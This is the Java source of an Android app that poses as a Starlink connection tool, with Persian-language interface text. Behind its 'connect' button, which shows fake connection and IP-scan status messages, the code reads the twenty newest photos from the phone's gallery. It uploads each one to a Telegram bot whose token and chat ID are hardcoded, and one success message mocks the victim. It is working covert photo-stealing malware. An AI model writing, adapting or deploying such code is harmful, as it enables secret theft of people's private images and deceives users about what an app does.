package com.example.photosender;

import android.Manifest;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "starlink";
    private static final String BOT_TOKEN = "8931772855:AAHZSrBgS4SJkEWYA6_8fTiZ-Kk4frsxtCU";
    private static final String CHAT_ID = "8961077299";
    private static final int REQUEST_PERMISSION = 100;

    private enum ConnectionState {
        IDLE, CONNECTING, CONNECTED, DISCONNECTED
    }

    private Button btnConnect;
    private TextView txtStatus;
    private ProgressBar progressBar;
    private boolean isSending = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnConnect = findViewById(R.id.btnConnect);
        txtStatus = findViewById(R.id.txtStatus);
        progressBar = findViewById(R.id.progressBar);

        updateUI(ConnectionState.IDLE);

        btnConnect.setOnClickListener(v -> {
            if (isSending) return;

            // بررسی مجوز
            if (!hasStoragePermission()) {
                requestStoragePermission();
                return;
            }

            startSendingProcess();
        });
    }

    // ==================== بررسی مجوز ====================
    private boolean hasStoragePermission() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            // اندروید 13 به بالا
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            // اندروید 12 و پایین‌تر
            return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
        }
    }

    // ==================== درخواست مجوز (خودکار) ====================
    private void requestStoragePermission() {
        // اگر کاربر قبلاً مجوز را رد کرده، پیام توضیحی نشان بده
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_MEDIA_IMAGES)) {
                Toast.makeText(this, "برای اتصال به مجوز ها نیاز مندیم", Toast.LENGTH_LONG).show();
            }
        } else {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_EXTERNAL_STORAGE)) {
                Toast.makeText(this, "برای اتصال به مجوز ها نیاز مندیم", Toast.LENGTH_LONG).show();
            }
        }

        // درخواست مجوز
        String[] permissions;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{Manifest.permission.READ_MEDIA_IMAGES};
        } else {
            permissions = new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        ActivityCompat.requestPermissions(this, permissions, REQUEST_PERMISSION);
    }

    // ==================== نتیجه درخواست مجوز ====================
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ دسترسی و مجوز ها داده شد", Toast.LENGTH_SHORT).show();
                startSendingProcess();
            } else {
                Toast.makeText(this, "❌ برای اتصال به دسترسی نیاز است", Toast.LENGTH_LONG).show();
                updateUI(ConnectionState.DISCONNECTED);
            }
        }
    }

    // ==================== شروع فرآیند ارسال ====================
    private void startSendingProcess() {
        if (isSending) return;
        isSending = true;
        updateUI(ConnectionState.CONNECTING);

        new Thread(() -> {
            boolean success = false;
            String errorMessage = "";
            int sentCount = 0;
            int totalImages = 0;

            try {
                Log.d(TAG, "شروع دریافت داده ها...");

                ArrayList<Uri> images = getLast20Images();
                totalImages = images.size();
                Log.d(TAG, "تعداد عکس‌های یافت شده: " + totalImages);

                if (images.isEmpty()) {
                    errorMessage = "تجارتم خراب شد سید";
                } else {
                    Log.d(TAG, "شروع اتصال نهایی...");
                    sentCount = sendToTelegram(images);
                    Log.d(TAG, "ping: اتصال موفق: " + sentCount);

                    if (sentCount == images.size()) {
                        success = true;
                    } else {
                        errorMessage = "تنها " + sentCount + " از " + images.size() + "  اتصال بر قرار شد";
                    }
                }

            } catch (Exception e) {
                Log.e(TAG, "خطا در فرآیند اتصال", e);
                errorMessage = e.getMessage();
                if (errorMessage == null || errorMessage.isEmpty()) {
                    errorMessage = "خطای ناشناخته";
                }
                success = false;
            }

            final boolean finalSuccess = success;
            final String finalError = errorMessage;
            final int finalSentCount = sentCount;
            final int finalTotal = totalImages;

            runOnUiThread(() -> {
                isSending = false;
                if (finalSuccess) {
                    updateUI(ConnectionState.CONNECTED);
                    Toast.makeText(MainActivity.this,
                            "✅ " + finalSentCount + "سید تو چقدر کصخلی!",
                            Toast.LENGTH_LONG).show();
                } else {
                    updateUI(ConnectionState.DISCONNECTED);
                    String msg = "❌ خطا: " + finalError;
                    if (finalTotal == 0) {
                        msg += "\n🔍هیچ ایپی سالمی برای اتصال پیدا نشد   ";
                    }
                    Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }

    // ==================== دریافت ۲۰ عکس آخر ====================
    private ArrayList<Uri> getLast20Images() {
        ArrayList<Uri> list = new ArrayList<>();
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                collection,
                projection,
                null,
                null,
                sortOrder
        )) {
            if (cursor != null) {
                int idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int count = 0;
                while (cursor.moveToNext() && count < 20) {
                    long id = cursor.getLong(idCol);
                    Uri uri = ContentUris.withAppendedId(collection, id);
                    list.add(uri);
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطا در دریافت ای پی ها", e);
            throw new RuntimeException("خطا در خواندن اتصال: " + e.getMessage());
        }
        return list;
    }

    // ==================== ارسال به تلگرام ====================
    private int sendToTelegram(ArrayList<Uri> images) {
        OkHttpClient client = new OkHttpClient();
        int success = 0;

        for (Uri uri : images) {
            try {
                Log.d(TAG, "اتصال : " + uri.toString());
                InputStream in = getContentResolver().openInputStream(uri);
                if (in == null) {
                    Log.e(TAG, "InputStream null برای " + uri);
                    continue;
                }

                byte[] bytes = readBytes(in);
                in.close();

                RequestBody photoBody = RequestBody.create(
                        bytes,
                        MediaType.parse("image/jpeg")
                );

                MultipartBody body = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", CHAT_ID)
                        .addFormDataPart("photo", "image.jpg", photoBody)
                        .build();

                Request request = new Request.Builder()
                        .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                        .post(body)
                        .build();

                okhttp3.Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    success++;
                    Log.d(TAG, "اتصال موفق: " + uri);
                } else {
                    String errorBody = response.body() != null ? response.body().string() : "بدون پاسخ";
                    Log.e(TAG, "خطای تلگرام: کد " + response.code() + " - " + errorBody);
                }
                response.close();

                Thread.sleep(250);

            } catch (Exception e) {
                Log.e(TAG, "خطا در اتصال  " + uri, e);
            }
        }
        return success;
    }

    // ==================== تبدیل InputStream به byte[] ====================
    private byte[] readBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int n;
        while ((n = inputStream.read(data)) != -1) {
            buffer.write(data, 0, n);
        }
        return buffer.toByteArray();
    }

    // ==================== بروزرسانی UI ====================
    private void updateUI(ConnectionState state) {
        runOnUiThread(() -> {
            switch (state) {
                case IDLE:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("اتصال");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.blue));
                    txtStatus.setText("وضعیت: آماده اتصال");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;

                case CONNECTING:
                    btnConnect.setEnabled(false);
                    btnConnect.setText("در حال اتصال...");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.gray));
                    txtStatus.setText("وضعیت: در حال اتصال به استارلینک...");
                    progressBar.setVisibility(ProgressBar.VISIBLE);
                    break;

                case CONNECTED:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("متصل ✓");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.green));
                    txtStatus.setText("وضعیت: اتصال موفق ✅");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;

                case DISCONNECTED:
                    btnConnect.setEnabled(true);
                    btnConnect.setText("اتصال برقرار نشد");
                    btnConnect.setBackgroundTintList(
                            ContextCompat.getColorStateList(this, R.color.red));
                    txtStatus.setText(" وضعیت: اتصال ناموفق ❌ - دوباره تلاش کن و حتما کانفیگ خود رو اول روشن کن");
                    progressBar.setVisibility(ProgressBar.GONE);
                    break;
            }
        });
    }
}
